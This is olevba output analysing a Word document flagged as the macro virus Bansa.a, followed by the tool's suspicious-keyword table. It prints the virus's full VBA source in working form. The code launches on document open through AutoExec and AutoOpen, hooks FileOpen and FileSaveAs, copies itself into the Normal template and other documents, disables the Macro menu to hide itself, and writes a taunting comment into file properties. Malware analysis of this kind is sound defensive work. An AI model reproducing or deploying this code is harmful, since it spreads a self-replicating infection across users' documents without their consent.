olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bansa.a-91e03b4a01ebbb5fb4f3ec49b6fb72c06332b4bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bansa.a-91e03b4a01ebbb5fb4f3ec49b6fb72c06332b4bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bangsat.bas 
in file: Virus.MSWord.Bansa.a-91e03b4a01ebbb5fb4f3ec49b6fb72c06332b4bd - OLE stream: 'Macros/VBA/Bangsat'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Bangsat
' version 1.0a
' release 1
' dated October 01, 2001
' origin PMKN, Malaysia
' created by (iB@, Evbat, ali) all are same person, different identity
' from the MVS Studio
' message -> Thanks for being something in my life...
' and to whom did assemble this macro, There You'll Be, I Know!
' drop me a line at macam_jarum@yahoo.com

Sub AutoExec()
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
BangsatSembunyi
End Sub

Sub AutoOpen()
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
SangatBangsat
End Sub

Function SangatBangsat()
On Error Resume Next
Dim MulaBangsat As String
If MacroContainer = NormalTemplate Then
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(i).CodeModule = "Bangsat" Then
GoTo DahKenaBangsat
Else
MulaBangsat = NormalTemplate.VBProject.VBComponents.Item("Bangsat").CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item("Bangsat").CodeModule.CountOfLines)
ActiveDocument.VBProject.VBComponents.Add vbext_ct_StdModule
ActiveDocument.VBProject.VBComponents.Item("Module1").CodeModule.AddFromString MulaBangsat
ActiveDocument.VBProject.VBComponents.Item("Module1").Name = "Bangsat"
BangsatMenggatal
ActiveDocument.Save
End If
Next i
Else
MulaBangsat = ActiveDocument.VBProject.VBComponents.Item("Bangsat").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item("Bangsat").CodeModule.CountOfLines)
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Bangsat", 3
NormalTemplate.Save
End If
DahKenaBangsat:
End Function

Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
SangatBangsat
Application.StatusBar = "Bangsat betul si Liman tu yer...!!!"
End Sub

Function BangsatSembunyi()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
End Function

Function BangsatMenggatal()
With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "Bangsat untuk kita menyukai orang, kemudian membencinya pula...macam_jarum@yahoo.com"
    .Execute
End With
End Function

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
SangatBangsat
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

